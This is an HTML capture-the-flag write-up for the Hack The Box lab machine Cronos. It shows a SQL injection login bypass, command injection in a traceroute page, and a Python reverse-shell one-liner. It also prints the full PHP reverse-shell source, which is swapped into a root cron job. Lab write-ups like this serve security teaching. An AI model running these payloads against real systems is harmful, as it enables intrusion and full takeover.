@@ -1,0 +1,429 @@
+<head>
+	<!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	
+	<!-- Bootstrap CSS -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+	
+	<!-- Custom CSS -->
+	<link rel="stylesheet" type="text/css" href="../assets/static/main.css">
+</head>
+<body>
+	<div class="container">
+		<header class="header">
+			<div class="topnav-left">
+				<h1>
+					Hybryx Cyber Security
+				</h1>
+			</div>
+			<div class="topnav-right">
+				<a href="/">Home</a>
+				<a href="/about.html">About</a>
+			</div>
+		</header>
+	</div>
+	<div class="container">
+		<main>
+			<div class="text-center">
+<img src="../assets/cronos/cronos.png" alt="">
+</div>
+<h1>
+	Initial Scans
+</h1>
+<p>
+	We start by running a full port service version Nmap scan. After some time, we get our results back and find three open ports.
+</p>
+<pre>
+<code>
+hybryx@kali:~/Documents/cronos/nmap/fullNmap$ nmap -oA cronosFull -p- -sV cronos<br>
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-01 17:53 EST<br>
+Nmap scan report for cronos (10.10.10.13)<br>
+Host is up (0.030s latency).<br>
+Not shown: 65532 filtered ports<br>
+PORT   STATE SERVICE VERSION<br>
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)<br>
+53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)<br>
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
+Nmap done: 1 IP address (1 host up) scanned in 124.88 seconds<br>
+</code>
+</pre>
+<h1>
+	Bind 9 Enum
+</h1>
+<p>
+	We see that ISC BIND 9 is open which is a DNS service. We can see if we can get a zone transfer from this DNS server. A zone transfer is when a DNS server sends its known DNS records to the requester. This is a powerful enumeration tool for us since it will leak all the named domains that the target service knows about.
+</p>
+<pre>
+<code>
+hybryx@kali:~/Documents/cronos/nmap/fullNmap$ dig axfr cronos.htb @cronos<br>
+; <<>> DiG 9.16.4-Debian <<>> axfr cronos.htb @cronos<br>
+;; global options: +cmd<br>
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800<br>
+cronos.htb.             604800  IN      NS      ns1.cronos.htb.<br>
+cronos.htb.             604800  IN      A       10.10.10.13<br>
+admin.cronos.htb.       604800  IN      A       10.10.10.13<br>
+ns1.cronos.htb.         604800  IN      A       10.10.10.13<br>
+www.cronos.htb.         604800  IN      A       10.10.10.13<br>
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800<br>
+;; Query time: 28 msec<br>
+;; SERVER: 10.10.10.13#53(10.10.10.13)<br>
+;; WHEN: Fri Jan 01 18:34:21 EST 2021<br>
+;; XFR size: 7 records (messages 1, bytes 203)<br>
+</code>
+</pre>
+<p>
+	We can see from the zone transfer that we have one domain with two sub domains; cronos.htb, admin.cronos.htb, and ns1.cronos.htb.
+</p>
+<h1>
+	HTTP Enum
+</h1>
+<p>
+	Now that we have some subdomains, we can visit them in a web broswer to see what they have to offer. By visiting just the IP, no virtual hosting, it is just the default apache page. But if we visit the admin.cronos.htb subdomain we see the following.
+</p>
+<div class="text-center">
+<img src="../assets/cronos/adminSubDomain.png" alt="">
+</div>
+<h1>
+	Admin Subdomain Enum
+</h1>
+<p>
+	We see that this subdomain contains a standard login form. We can try some very simple SQL Injections to see if we can bypass this login. Eventually we are able to login using
+</p>
+<pre>
+<code>
+admin' or '1'='1<br>
+</code>
+</pre>
+<p>
+	in the username field.
+</p>
+<div class="text-center">
+<img src="../assets/cronos/loginBypass.png" alt="">
+</div>
+<p>
+	We are able to login with this SQL Injection and we get to a Webpage that appears to host a traceroute tool.
+</p>
+<div class="text-center">
+<img src="../assets/cronos/traceroute.png" alt="">
+</div>
+<p>
+	When we try to actually use this tool it appears to execute it traceroute request but not show any results. If we assume that this is using a bash system execute we can append extra commands by using the bash command delimiter of ; (semicolon). By tracerouting
+</p>
+<pre>
+<code>
+;ls<br>
+</code>
+</pre>
+<p>
+	we see that we can execute remote commands
+</p>
+<div class="text-center">
+<img src="../assets/cronos/RCE_ls.png" alt="">
+</div>
+<p>
+	Next we see what tools we have that could help us get a shell. By running
+</p>
+<pre>
+<code>
+;which python<br>
+</code>
+</pre>
+<p>
+	we can see that we have access to python2.
+</p>
+<div class="text-center">
+<img src="../assets/cronos/RCE_whichPython.png" alt="">
+</div>
+<p>
+	We can use python to throw us a reverse shell. First, we start a netcat listener on our local machine;
+</p>
+<pre>
+<code>
+nc -lvp 8989<br>
+</code>
+</pre>
+<p>
+	. Now we use python to throw us a reverse shell. Execute the following command in the traceroute web command. Make sure to change out the IP and port number to your own choosing!
+</p>
+<pre>
+<code>
+;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br>
+</code>
+</pre>
+<p>
+	Then we check our listener to see that we have a shell as www-data. We see that it is not a tty so we use python's tty module to upgrade our shell.
+</p>
+<pre>
+<code>
+python -c 'import tty; tty.spawn("/bin/bash")'<br>
+</code>
+</pre>
+<div class="text-center">
+<img src="../assets/cronos/reverseShell.png" alt="">
+</div>
+<p>
+	From here we cd to home and find that there is a user named noulis. We also find that we are able to read the user flag.
+</p>
+<div class="text-center">
+<img src="../assets/cronos/user.png" alt="">
+</div>
+<h1>
+	Priv Esc to Root
+</h1>
+<p>
+	Now we need to start looking for a path to root. We upload LinPeas to the system using wget. First we start a python3 http server on our local machine in the same directory as the LinPeas script;
+</p>
+<pre>
+<code>
+python3 -m http.server<br>
+</code>
+</pre>
+<p>
+	. Next we use wget in our reverse shell on the target machine to use http get to retrieve this enum script. We do this from the /tmp directory so that we have full permissions on the file;
+</p>
+<pre>
+<code>
+cd /tmp && wget http://10.10.14.15:8000/linpeas.sh<br>
+</code>
+</pre>
+<p>
+	. Now that we have the enum script on the system, we add the execute flag and run the script;
+</p>
+<pre>
+<code>
+chmod +x linpeas.sh && ./linpeas.sh<br>
+</code>
+</pre>
+<p>
+	.
+</p>
+<p>
+	After reading this file we see the following line.
+</p>
+<div class="text-center">
+<img src="../assets/cronos/linpeas.png" alt="">
+</div>
+<p>
+	The five asterisk means that this scripts runs every minute. We check the permissions on that file to be the following.
+</p>
+<pre>
+<code>
+www-data@cronos:/var/www/laravel$ ls -al artisan<br>
+ls -al artisan<br>
+-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 artisan<br>
+</code>
+</pre>
+<p>
+	This file is owned by the user we currently are and is being executed by root every minute. This is a php file so we will use [Pentest Monkey's PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). Change the IP and Port lines and transfer the file to the target machine using the python http server like we did before saving the file in /tmp. My file after alteration is:
+</p>
+<pre>
+<code>
+<?php<br>
+// php-reverse-shell - A Reverse Shell implementation in PHP<br>
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net<br>
+//<br>
+// This tool may be used for legal purposes only.  Users take full responsibility<br>
+// for any actions performed using this tool.  The author accepts no liability<br>
+// for damage caused by this tool.  If these terms are not acceptable to you, then<br>
+// do not use this tool.<br>
+//<br>
+// In all other respects the GPL version 2 applies:<br>
+//<br>
+// This program is free software; you can redistribute it and/or modify<br>
+// it under the terms of the GNU General Public License version 2 as<br>
+// published by the Free Software Foundation.<br>
+//<br>
+// This program is distributed in the hope that it will be useful,<br>
+// but WITHOUT ANY WARRANTY; without even the implied warranty of<br>
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the<br>
+// GNU General Public License for more details.<br>
+//<br>
+// You should have received a copy of the GNU General Public License along<br>
+// with this program; if not, write to the Free Software Foundation, Inc.,<br>
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.<br>
+//<br>
+// This tool may be used for legal purposes only.  Users take full responsibility<br>
+// for any actions performed using this tool.  If these terms are not acceptable to<br>
+// you, then do not use this tool.<br>
+//<br>
+// You are encouraged to send comments, improvements or suggestions to<br>
+// me at pentestmonkey@pentestmonkey.net<br>
+//<br>
+// Description<br>
+// -----------<br>
+// This script will make an outbound TCP connection to a hardcoded IP and port.<br>
+// The recipient will be given a shell running as the current user (apache normally).<br>
+//<br>
+// Limitations<br>
+// -----------<br>
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+<br>
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.<br>
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.<br>
+//<br>
+// Usage<br>
+// -----<br>
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.<br>
+set_time_limit (0);<br>
+$VERSION = "1.0";<br>
+$ip = '10.10.14.15';  // CHANGE THIS<br>
+$port = 8991;       // CHANGE THIS<br>
+$chunk_size = 1400;<br>
+$write_a = null;<br>
+$error_a = null;<br>
+$shell = 'uname -a; w; id; /bin/sh -i';<br>
+$daemon = 0;<br>
+$debug = 0;<br>
+//<br>
+// Daemonise ourself if possible to avoid zombies later<br>
+//<br>
+// pcntl_fork is hardly ever available, but will allow us to daemonise<br>
+// our php process and avoid zombies.  Worth a try...<br>
+if (function_exists('pcntl_fork')) {<br>
+// Fork and have the parent process exit<br>
+$pid = pcntl_fork();<br>
+if ($pid == -1) {<br>
+printit("ERROR: Can't fork");<br>
+exit(1);<br>
+}<br>
+if ($pid) {<br>
+exit(0);  // Parent exits<br>
+}<br>
+// Make the current process a session leader<br>
+// Will only succeed if we forked<br>
+if (posix_setsid() == -1) {<br>
+printit("Error: Can't setsid()");<br>
+exit(1);<br>
+}<br>
+$daemon = 1;<br>
+} else {<br>
+printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");<br>
+}<br>
+// Change to a safe directory<br>
+chdir("/");<br>
+// Remove any umask we inherited<br>
+umask(0);<br>
+//<br>
+// Do the reverse shell...<br>
+//<br>
+// Open reverse connection<br>
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);<br>
+if (!$sock) {<br>
+printit("$errstr ($errno)");<br>
+exit(1);<br>
+}<br>
+// Spawn shell process<br>
+$descriptorspec = array(<br>
+0 => array("pipe", "r"),  // stdin is a pipe that the child will read from<br>
+1 => array("pipe", "w"),  // stdout is a pipe that the child will write to<br>
+2 => array("pipe", "w")   // stderr is a pipe that the child will write to<br>
+);<br>
+$process = proc_open($shell, $descriptorspec, $pipes);<br>
+if (!is_resource($process)) {<br>
+printit("ERROR: Can't spawn shell");<br>
+exit(1);<br>
+}<br>
+// Set everything to non-blocking<br>
+// Reason: Occsionally reads will block, even though stream_select tells us they won't<br>
+stream_set_blocking($pipes[0], 0);<br>
+stream_set_blocking($pipes[1], 0);<br>
+stream_set_blocking($pipes[2], 0);<br>
+stream_set_blocking($sock, 0);<br>
+printit("Successfully opened reverse shell to $ip:$port");<br>
+while (1) {<br>
+// Check for end of TCP connection<br>
+if (feof($sock)) {<br>
+printit("ERROR: Shell connection terminated");<br>
+break;<br>
+}<br>
+// Check for end of STDOUT<br>
+if (feof($pipes[1])) {<br>
+printit("ERROR: Shell process terminated");<br>
+break;<br>
+}<br>
+// Wait until a command is end down $sock, or some<br>
+// command output is available on STDOUT or STDERR<br>
+$read_a = array($sock, $pipes[1], $pipes[2]);<br>
+$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);<br>
+// If we can read from the TCP socket, send<br>
+// data to process's STDIN<br>
+if (in_array($sock, $read_a)) {<br>
+if ($debug) printit("SOCK READ");<br>
+$input = fread($sock, $chunk_size);<br>
+if ($debug) printit("SOCK: $input");<br>
+fwrite($pipes[0], $input);<br>
+}<br>
+// If we can read from the process's STDOUT<br>
+// send data down tcp connection<br>
+if (in_array($pipes[1], $read_a)) {<br>
+if ($debug) printit("STDOUT READ");<br>
+$input = fread($pipes[1], $chunk_size);<br>
+if ($debug) printit("STDOUT: $input");<br>
+fwrite($sock, $input);<br>
+}<br>
+// If we can read from the process's STDERR<br>
+// send data down tcp connection<br>
+if (in_array($pipes[2], $read_a)) {<br>
+if ($debug) printit("STDERR READ");<br>
+$input = fread($pipes[2], $chunk_size);<br>
+if ($debug) printit("STDERR: $input");<br>
+fwrite($sock, $input);<br>
+}<br>
+}<br>
+fclose($sock);<br>
+fclose($pipes[0]);<br>
+fclose($pipes[1]);<br>
+fclose($pipes[2]);<br>
+proc_close($process);<br>
+// Like print, but does nothing if we've daemonised ourself<br>
+// (I can't figure out how to redirect STDOUT like a proper daemon)<br>
+function printit ($string) {<br>
+if (!$daemon) {<br>
+print "$string\n";<br>
+}<br>
+}<br>
+?><br>
+</code>
+</pre>
+<p>
+	We are about to try and get our root shell but we need a bunch of things to happen at once. First, open up a NetCat listener with the port you selected in the PHP Reverse Shell script;
+</p>
+<pre>
+<code>
+nc -lvp 8991<br>
+</code>
+</pre>
+<p>
+	. We do not want to alter the original file in case we need to replace it back to original on the system but we do not want to crash anything if the cron job runs and there's no file to execute. We will be moving all the files at the same time to prevent any errors. We will move the original file to a backup file, and move the reverse shell into the laravel directory and renaming it to be the same as the original so the cron job executes it; ﻿
+</p>
+<pre>
+<code>
+mv artisan artisan.bak && mv /tmp/php-reverse-shell.php ./artisan<br>
+</code>
+</pre>
+<p>
+	.
+</p>
+<p>
+	Go check your NetCat listener and after a minute or so you should see a root shell.
+</p>
+<div class="text-center">
+<img src="../assets/cronos/rootShell.png" alt="">
+</div>
+<p>
+	We CD to /root and grab root flag.
+</p>
+<div class="text-center">
+<img src="../assets/cronos/root.png" alt="">
+</div>
+
+		</main>
+	</div>
+	<div class="container">
+		<footer class="footer">
+			
+		</footer>
+	</div>
+</body>
